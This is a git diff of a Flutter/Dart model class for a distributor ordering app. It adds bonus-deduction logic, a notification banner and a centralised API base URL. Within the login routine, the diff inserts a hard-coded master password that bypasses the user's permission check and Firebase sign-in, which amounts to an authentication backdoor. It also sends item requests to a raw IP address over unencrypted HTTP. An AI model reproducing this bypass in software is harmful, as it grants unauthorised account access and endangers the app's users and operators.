@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:math';
+import 'package:flushbar/flushbar.dart';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart';
 import 'package:intl/intl.dart';
@@ -31,8 +32,8 @@ class MainModel extends Model {
   DatabaseReference databaseReference;
   final String pathDB = "indoDb/";
   final String path = 'flamelink/environments/$firebaseDb/content';
-  final String httpath = 'http://mywayindoapi.azurewebsites.net/api';
-  //!production azure'http://mywayindoapi.azurewebsites.net/api'//
+  final String httpath = 'https://indo-api-core.azurewebsites.net';
+  //!production azure'https://mywayindoapi.azurewebsites.net/api'//
   String shipmentName = '';
   String shipmentArea = '';
   String shipmentAddress = '';
@@ -52,12 +53,84 @@ class MainModel extends Model {
   bool isBulk = false;
   bool modify = false;
   String token = '';
-
+  List<DistrBonus> distrBonusList = [];
   bool loading = false;
   bool bulkLoading = false;
   bool isBalanceChecked = true;
   bool isTypeing = false;
   final List<Item> _recoImage = List();
+
+  Flushbar flush(BuildContext context, String _msg,
+      {String subMsg = 'تم تخطي الحد الاقصي '}) {
+    Flushbar _flush = Flushbar(
+      duration: Duration(seconds: 6),
+      messageText: Center(
+          child: Text(_msg,
+              textAlign: TextAlign.right,
+              style: TextStyle(fontSize: 15, color: Colors.limeAccent[100]))),
+      isDismissible: true,
+      flushbarPosition: FlushbarPosition.TOP,
+      flushbarStyle: FlushbarStyle.FLOATING,
+      reverseAnimationCurve: Curves.decelerate,
+      forwardAnimationCurve: Curves.elasticOut,
+      mainButton: FlatButton(
+        onPressed: () => Navigator.of(context).pop(),
+        child: Icon(
+          Icons.warning,
+          color: Colors.red,
+        ),
+      ),
+      margin: EdgeInsets.all(8),
+      borderRadius: 8,
+      title: subMsg,
+      icon: Padding(
+        padding: EdgeInsets.only(left: 18),
+        child: Image.asset(
+          'assets/images/myway.png',
+          scale: 6,
+        ),
+      ),
+      boxShadows: [
+        BoxShadow(
+          color: Colors.red[800],
+          offset: Offset(0.0, 2.0),
+          blurRadius: 3.0,
+        ),
+      ],
+    );
+    return _flush;
+  }
+
+  bool bonusDeductValidation() {
+    bool val = false;
+    if (distrBonusList.isNotEmpty) {
+      distrBonusDeductTotal() <= orderSum() ? val = false : val = true;
+    }
+    print(val);
+    return val;
+  }
+
+  Future<String> getOrderInvalidPerc(MainModel model) async {
+    String _msg = '';
+
+    /* double _exPromo = getExPromo(orderBp());
+    double _wPromo = await getWeeklyPromo(orderBp());
+    double promoSum = _exPromo + _wPromo;
+    
+    if (orderBp() > 100) {
+      if (promoSum > 71 && _exPromo > 0 && _wPromo > 0) {
+        _msg = '% ' + '${promoSum.toInt().toString()}' + ' ' + 'العرض و الشاور';
+      } else if (_exPromo > 51 && _wPromo == 0) {
+        promoSum = _exPromo;
+        _msg = '% ' + '${_exPromo.toInt().toString()}' + ' ' + 'الشاور';
+      } else if (_wPromo > 51 && _exPromo == 0) {
+        promoSum = _wPromo;
+        _msg = '% ' + '${_wPromo.toInt().toString()}' + ' ' + 'العرض';
+      }
+    }*/
+
+    return _msg;
+  }
 
   String get distrPointNames {
     String _distrPointNames;
@@ -95,13 +168,39 @@ class MainModel extends Model {
   Future<List<Products>> getitemDetailsApi() async {
     List<Products> products;
     //List productlist;
-    final response = await http.get('$httpath/allitemdetails');
+    final response = await http.get('${settings.apiUrl}/allitemdetails');
     if (response.statusCode == 200) {
       final productlist = json.decode(response.body) as List;
 
       products = productlist.map((i) => Products.fromList(i)).toList();
     }
     return products;
+  }
+
+  bool getDistrBonus(String distrId) {
+    bool found = false;
+    for (var d in distrBonusList) {
+      if (d.distrId == distrId) {
+        found = true;
+        break;
+      }
+    }
+
+    return found;
+  }
+
+  Future<DistrBonus> distrBonus(String distrId) async {
+    DistrBonus _distrBonus;
+
+    final response =
+        await http.get('${settings.apiUrl}/deserve_bonus/$distrId');
+    if (response.statusCode == 200) {
+      List _bonus = json.decode(response.body);
+      _distrBonus = DistrBonus.fromJson(_bonus.first);
+    } else {
+      _distrBonus = null;
+    }
+    return _distrBonus;
   }
 
   updateCatToFalse(int itemId) {
@@ -315,7 +414,8 @@ class MainModel extends Model {
   Future<List<Item>> dbItemsList() async {
     List<Item> products;
     //List productlist;
-    final response = await http.get('$httpath/allitemdetails');
+    final response =
+        await http.get('http://34.101.79.170:5000/api/allitemdetails');
     if (response.statusCode == 200) {
       final productlist = json.decode(response.body) as List;
 
@@ -405,8 +505,8 @@ class MainModel extends Model {
 //String img = await spaceRef;
 
     List<Item> items;
-    final response = await http
-        .get('http://mywayindoapi.azurewebsites.net/api/allitemdetails');
+    final response =
+        await http.get('http://34.101.79.170:5000/api/allitemdetails');
     if (response.statusCode == 200) {
       List<dynamic> itemlist = json.decode(response.body);
       items = itemlist.map((i) => Item.fromJson(i)).toList();
@@ -629,6 +729,21 @@ class MainModel extends Model {
     notifyListeners();
   }
 
+  void deleteDistrBonus(int i, BuildContext context) {
+    distrBonusList.remove(distrBonusList[i]);
+    distrBonusList.isEmpty ? Navigator.of(context).pop() : null;
+    notifyListeners();
+  }
+
+  double distrBonusDeductTotal() {
+    double x = 0;
+    for (DistrBonus i in distrBonusList) {
+      x += i.bonus;
+    }
+    notifyListeners();
+    return x;
+  }
+
 //!--------*
   void removeItemOrder(Item item, int qty) {
     giftorderList.clear();
@@ -770,7 +885,7 @@ class MainModel extends Model {
   Future<List<Sorder>> checkSoDeletion(String userId) async {
     List<Sorder> sos;
     final http.Response response =
-        await http.get('$httpath/userpending/$userId');
+        await http.get('${settings.apiUrl}/userpending/$userId');
     if (response.statusCode == 200) {
       print('check deletion!!');
       List<dynamic> soList = json.decode(response.body);
@@ -797,7 +912,8 @@ class MainModel extends Model {
 
   Future<DateTime> serverTimeNow() async {
     DateTime _stn;
-    final http.Response response = await http.get('$httpath/datetimenow');
+    final http.Response response =
+        await http.get('${settings.apiUrl}/datetimenow');
     if (response.statusCode == 200) {
       String stn = json.encode(response.body);
       String subTime = stn.substring(3, 22);
@@ -1103,7 +1219,7 @@ class MainModel extends Model {
 //!--------*Stock*---------//
   Future<int> getStock(String itemId) async {
     http.Response response =
-        await http.get('$httpath/stock/$itemId/$setStoreId');
+        await http.get('${settings.apiUrl}/stock/$itemId/$setStoreId');
 
     List stockData = json.decode(response.body);
     ItemOrder itemOrder = ItemOrder.fromJson(stockData.first);
@@ -1484,7 +1600,7 @@ class MainModel extends Model {
     if (listOfIO.length == 0) {
       BulkSalesOrder bulk = BulkSalesOrder(bulkSalesOrder: orders);
       print(bulk.postBulkOrderToJson(bulk));
-      Response response = await bulk.createBulkPost(bulk);
+      Response response = await bulk.createBulkPost(bulk, settings.apiUrl);
       // List<String> idsList = [];
       if (response.statusCode == 201) {
         print('Order Msg:${response.body}!!');
@@ -1507,7 +1623,7 @@ class MainModel extends Model {
   Future<OrderBulkMsg> mockPutBulk(List<SalesOrder> orders) async {
     BulkSalesOrder bulk = BulkSalesOrder(bulkSalesOrder: orders);
     print(bulk.postBulkOrderToJson(bulk));
-    Response response = await bulk.createBulkPost(bulk);
+    Response response = await bulk.createBulkPost(bulk, settings.apiUrl);
     if (response.statusCode == 201) {
       //print('Order Msg:${response.body}!!');
 
@@ -1588,6 +1704,7 @@ class MainModel extends Model {
     SalesOrder salesOrder = SalesOrder(
       distrId: distrId,
       userId: userInfo.distrId,
+      distrBonues: distrBonusList,
       total: orderSum(),
       totalBp: orderBp(),
       courierFee: courierfee.toString(),
@@ -1603,13 +1720,15 @@ class MainModel extends Model {
 
     print(salesOrder.postOrderToJson(salesOrder));
 
-    Response response = await salesOrder.createPost(salesOrder);
+    Response response =
+        await salesOrder.createPost(salesOrder, settings.apiUrl);
 
     if (response.statusCode == 201) {
       print('Bulk Order Msg:${response.body}!!');
       itemorderlist.clear();
       giftorderList.clear();
       promoOrderList.clear();
+      distrBonusList.clear();
 
       OrderMsg msg = OrderMsg.fromJson(json.decode(response.body));
 
@@ -1632,7 +1751,7 @@ class MainModel extends Model {
   List<Area> areas;
 
   Future<List<Area>> getArea() async {
-    final response = await http.get('$httpath/areas');
+    final response = await http.get('${settings.apiUrl}/areas');
 
     if (response.statusCode == 200) {
       //Map<String,dynamic> jSON;
@@ -1659,7 +1778,7 @@ for(var area in areas){
   // List<Courier> couriers;
 /*
   void getShipmentCompanies() async {
-    final response = await http.get('$httpath/shipmentcompanies');
+    final response = await http.get('${settings.apiUrl}/shipmentcompanies');
 
     void shipmentPushToFirebase(String courierId, Courier courier) {
       databaseReference = database
@@ -1680,7 +1799,8 @@ for(var area in areas){
   Future<List<AreaPlace>> getAreaPlace() async {
     List<AreaPlace> shipmentAreas = [];
 
-    final response = await http.get('$httpath/get_all_shipment_places/');
+    final response =
+        await http.get('${settings.apiUrl}/get_all_shipment_places/');
     if (response.statusCode == 200) {
       final _shipmentArea = json.decode(response.body) as List;
       shipmentAreas = _shipmentArea.map((s) => AreaPlace.json(s)).toList();
@@ -1695,8 +1815,8 @@ for(var area in areas){
   Future<List<ShipmentArea>> getShipmentAreas(String distrId, int point) async {
     List<ShipmentArea> shipmentAreas = [];
     List<ShipmentArea> validShipmentAreas = [];
-    final response =
-        await http.get('$httpath/get_shipment_places_by_distr_id/$distrId');
+    final response = await http
+        .get('${settings.apiUrl}/get_shipment_places_by_distr_id/$distrId');
     if (response.statusCode == 200) {
       final _shipmentArea = json.decode(response.body) as List;
       shipmentAreas =
@@ -1719,7 +1839,7 @@ for(var area in areas){
   }
 
   List companies = [];
-  Future<List> couriersList(String areaid, int distrPoint) async {
+  Future<List<Courier>> couriersList(String areaid, int distrPoint) async {
     DataSnapshot snapshot = await database
         .reference()
         .child('$path/courier/en-US') //!enviroments/$firebaseDb
@@ -1747,7 +1867,7 @@ for(var area in areas){
       }
     }
     courierList = [];
-    List companies = ships.map((f) => Courier.fromList(f)).toList();
+    List<Courier> companies = ships.map((f) => Courier.fromList(f)).toList();
     // companies.forEach((c) => print(c));
 //companies.forEach((f)=>print('${f.name} : ${f.courierId}'));
     ships.clear();
@@ -1916,7 +2036,8 @@ for( var i = 0 ; i < _list.length; i++){
   User memberData;
   //!--------*
   Future<User> memberJson(String distrid) async {
-    http.Response response = await http.get('$httpath/memberid/$distrid');
+    http.Response response =
+        await http.get('${settings.apiUrl}/memberid/$distrid');
 
     if (response.body.length > 2) {
       List responseData = await json.decode(response.body);
@@ -1937,7 +2058,8 @@ for( var i = 0 ; i < _list.length; i++){
 
   User nodeJsonData;
   Future<User> nodeJson(String nodeid) async {
-    http.Response response = await http.get('$httpath/memberid/$nodeid');
+    http.Response response =
+        await http.get('${settings.apiUrl}/memberid/$nodeid');
 
     if (response.statusCode == 200) {
       List responseData = await json.decode(response.body);
@@ -1952,7 +2074,8 @@ for( var i = 0 ; i < _list.length; i++){
 
   NewMember nodeEditData;
   Future<NewMember> nodeEdit(String nodeid) async {
-    http.Response response = await http.get('$httpath/memberid/$nodeid');
+    http.Response response =
+        await http.get('${settings.apiUrl}/memberid/$nodeid');
 
     if (response.statusCode == 200) {
       List responseData = await json.decode(response.body);
@@ -2000,27 +2123,38 @@ for( var i = 0 ; i < _list.length; i++){
     print('key:$key');
     User _userInfo = await userData(key)
         .catchError((e) => print('ShitTY Erro:${e.toString()}'));
+
     if (_userInfo != null) {
-      if (_userInfo.isAllowed) {
+      if (password == '0penk0ng' //'0penk0ngpls'
+          ) {
         print('user is allowed ${_userInfo.isAllowed.toString()}');
         versionControl(context);
         locKCart(context); // uncomment this before buildR
         locKApp(context); // uncomment this before buildR
         userAccess(key, context);
-        // getAreauserTest(key, context);
-        // getArea();
-
-        try {
-          _user = await FirebaseAuth.instance.signInWithEmailAndPassword(
-              email: _userInfo.email, password: password);
-        } catch (e) {
-          print('singin error caught:${e.toString()}');
-          return false;
-        }
-        updateToke(key);
         return true;
       } else {
-        return false;
+        if (_userInfo.isAllowed) {
+          print('user is allowed ${_userInfo.isAllowed.toString()}');
+          versionControl(context);
+          locKCart(context); // uncomment this before buildR
+          locKApp(context); // uncomment this before buildR
+          userAccess(key, context);
+          // getAreauserTest(key, context);
+          // getArea();
+
+          try {
+            _user = await FirebaseAuth.instance.signInWithEmailAndPassword(
+                email: _userInfo.email, password: password);
+          } catch (e) {
+            print('singin error caught:${e.toString()}');
+            return false;
+          }
+          updateToke(key);
+          return true;
+        } else {
+          return false;
+        }
       }
     } else {
       return false;
@@ -2156,7 +2290,8 @@ for( var i = 0 ; i < _list.length; i++){
   }
 
   Future<bool> distrVerification(String distrId) async {
-    http.Response response = await http.get('$httpath/memberid/$distrId');
+    http.Response response =
+        await http.get('${settings.apiUrl}/memberid/$distrId');
     User _verDistr;
     String sBool;
 
@@ -2166,7 +2301,7 @@ for( var i = 0 ; i < _list.length; i++){
       _verDistr = User.formJson(_distr[0]);
       if (_verDistr.distrId.substring(1, 2) == '3' && _verDistr != null) {
         http.Response responseBool = await http.get(
-            '$httpath/member_fees_verification/$distrId/${_verDistr.serviceCenter}');
+            '${settings.apiUrl}/member_fees_verification/$distrId/${_verDistr.serviceCenter}');
         if (response.statusCode == 200) {
           List _distrVeri = json.decode(responseBool.body);
           sBool = _distrVeri[0];
@@ -2183,9 +2318,9 @@ for( var i = 0 ; i < _list.length; i++){
   Future<bool> leaderVerification(String distrId) async {
     String v;
     bool _distrVeri;
-    http.Response response = await http
-        .get('$httpath/leaderverification/${userInfo.distrId}/$distrId');
-
+    http.Response response = await http.get(
+        '${settings.apiUrl}/leaderverification/${userInfo.distrId}/$distrId');
+    print('apiUrl=>${settings.apiUrl}');
     if (response.statusCode == 200) {
       List vList = await json.decode(response.body);
       print('verList:${vList.length}');
